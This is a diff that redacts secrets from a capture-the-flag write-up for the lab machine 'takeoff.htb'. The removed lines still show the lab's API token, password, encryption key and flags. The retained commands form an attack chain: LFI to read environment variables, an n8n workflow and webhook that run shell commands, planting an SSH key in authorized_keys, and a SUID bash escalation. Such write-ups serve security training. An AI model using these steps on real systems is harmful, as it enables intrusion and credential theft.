@@ -7,8 +7,8 @@
 | **OS** | Linux (Debian 13, kernel 6.12) |
 | **IP** | 10.129.250.248 |
 | **Hostname** | takeoff.htb |
-| **User Flag** | `*******` |
-| **Root Flag** | `*******` |
+| **User Flag** | [REDACTED] |
+| **Root Flag** | [REDACTED] |
 
 ## Tools Used
 
@@ -65,10 +65,10 @@
 | Credential | Source | Works For |
 |------------|--------|-----------|
 | `ctfplayer@htb.local` / `P4ssw0rd!123` | Registered by us | Web app login |
-| `TICKET_VALIDATION_TOKEN` = `JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR` | LFI on /proc/self/environ | HMAC signing for check-in exploit |
-| `N8N_API_KEY` = `eyJhbGciOiJIUzI1NiIs...RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo` | LFI on /proc/self/environ | n8n REST API authentication |
-| `kpark@takeoff.htb` / `AFLpGlrx1XiMB88v` | n8n container env vars | n8n web UI only (NOT SSH, NOT su) |
-| n8n encryption key = `YfpBa/9eifEvfvTjjJwVObCRyDx4HkHV` | n8n container /root/.n8n/config | Decrypting n8n credential store |
+| `TICKET_VALIDATION_TOKEN` = `[REDACTED]` | LFI on /proc/self/environ | HMAC signing for check-in exploit |
+| `N8N_API_KEY` = `[REDACTED]` | LFI on /proc/self/environ | n8n REST API authentication |
+| `kpark@takeoff.htb` / `[REDACTED]` | n8n container env vars | n8n web UI only (NOT SSH, NOT su) |
+| n8n encryption key = `[REDACTED]` | n8n container /root/.n8n/config | Decrypting n8n credential store |
 
 ## Attack Chain Overview
 
@@ -251,8 +251,8 @@ curl -s -b /tmp/cookies.txt \
 The environment variables are null-byte separated. The critical values:
 
 ```
-TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR
-N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo
+TICKET_VALIDATION_TOKEN=[REDACTED]
+N8N_API_KEY=[REDACTED]
 ```
 
 #### Reading the systemd unit file
@@ -539,7 +539,7 @@ From the process environment, we have the `N8N_API_KEY`. The n8n instance runs o
 From the www-data shell:
 
 ```bash
-curl -s -H "X-N8N-API-KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo" \
+curl -s -H "X-N8N-API-KEY: [REDACTED]" \
   http://127.0.0.1:5678/api/v1/workflows
 ```
 
@@ -571,7 +571,7 @@ The `n8n-nodes-base.executeCommand` node runs shell commands directly — no san
 
 ```bash
 curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
-  -H "X-N8N-API-KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo" \
+  -H "X-N8N-API-KEY: [REDACTED]" \
   -H "Content-Type: application/json" \
   -d '{
     "name": "Flex",
@@ -661,7 +661,7 @@ Key findings:
 | Variable | Value |
 |----------|-------|
 | `N8N_BASIC_AUTH_USER` | `kpark@takeoff.htb` |
-| `N8N_BASIC_AUTH_PASSWORD` | `AFLpGlrx1XiMB88v` |
+| `N8N_BASIC_AUTH_PASSWORD` | `[REDACTED]` |
 | `N8N_USER_MANAGEMENT_DISABLED` | `true` |
 | `N8N_BASIC_AUTH_ACTIVE` | `true` |
 | `NODE_VERSION` | `24.15.0` |
@@ -673,12 +673,12 @@ Tried kpark's n8n password for system access:
 ```bash
 # From Kali — SSH as kpark
 ssh kpark@10.129.250.248
-# Password: AFLpGlrx1XiMB88v
+# Password: [REDACTED]
 # Result: Permission denied (publickey,password).
 
 # From www-data shell — su to kpark
 su - kpark
-# Password: AFLpGlrx1XiMB88v
+# Password: [REDACTED]
 # Result: Authentication failure
 ```
 
@@ -706,7 +706,7 @@ curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/root/user.txt"
 ```
 
 ```json
-{"exitCode":0,"stderr":"","stdout":"cbcf53f421f1ec25ed4e0a4806f264e8"}
+{"exitCode":0,"stderr":"","stdout":"[REDACTED]"}
 ```
 
 **User flag: `cb*******e8`**
@@ -718,7 +718,7 @@ curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/root/.n8n/config"
 ```
 
 ```json
-{"encryptionKey": "YfpBa/9eifEvfvTjjJwVObCRyDx4HkHV"}
+{"encryptionKey": "[REDACTED]"}
 ```
 
 This key is used to encrypt credentials stored in n8n's SQLite database (`/root/.n8n/database.sqlite`). We explored decrypting the MySQL credentials from the SQLite DB but ultimately found a more direct path to root.
@@ -877,7 +877,7 @@ cat /tmp/kpark_key.pub
 ```
 
 ```
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQkTDcZqj+bjigkimxosAb2qTasNldPOYeLm8GDZtzg kali@kali
+ssh-ed25519 [REDACTED] kali@kali
 ```
 
 **Write the key from the container:**
@@ -890,7 +890,7 @@ curl -s "http://127.0.0.1:5678/webhook/flex?cmd=mkdir+-p+/root/.ssh"
 curl -s "http://127.0.0.1:5678/webhook/flex?cmd=chmod+700+/root/.ssh"
 
 # Write the public key (note: + in the key is URL-encoded as %2B)
-curl -s "http://127.0.0.1:5678/webhook/flex?cmd=echo+ssh-ed25519+AAAAC3NzaC1lZDI1NTE5AAAAIMQkTDcZqj%2BbjigkimxosAb2qTasNldPOYeLm8GDZtzg+kali@kali+>+/root/.ssh/authorized_keys"
+curl -s "http://127.0.0.1:5678/webhook/flex?cmd=echo+ssh-ed25519+[REDACTED]+kali@kali+>+/root/.ssh/authorized_keys"
 
 # Set ownership to kpark (uid 1001) — SSH requires the key file to be owned by the target user
 curl -s "http://127.0.0.1:5678/webhook/flex?cmd=chown+-R+1001:1001+/root/.ssh"
@@ -906,7 +906,7 @@ curl -s "http://127.0.0.1:5678/webhook/flex?cmd=cat+/root/.ssh/authorized_keys"
 ```
 
 ```json
-{"exitCode":0,"stderr":"","stdout":"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQkTDcZqj+bjigkimxosAb2qTasNldPOYeLm8GDZtzg kali@kali"}
+{"exitCode":0,"stderr":"","stdout":"ssh-ed25519 [REDACTED] kali@kali"}
 ```
 
 > **Important:** SSH is strict about permissions. The `.ssh` directory must be `700` and `authorized_keys` must be `600`, both owned by the target user. Without `chown 1001:1001`, SSH rejects the key with "Permission denied."
@@ -948,7 +948,7 @@ bash-5.2# cat /root/root.txt
 
 The `-p` flag tells bash not to drop privileges — without it, bash would reset the effective UID back to the real UID (kpark). With `-p`, the effective UID stays as root (from the SUID bit).
 
-**Root flag: `43******da`**
+**Root flag: `[REDACTED]`**
 
 ---
 
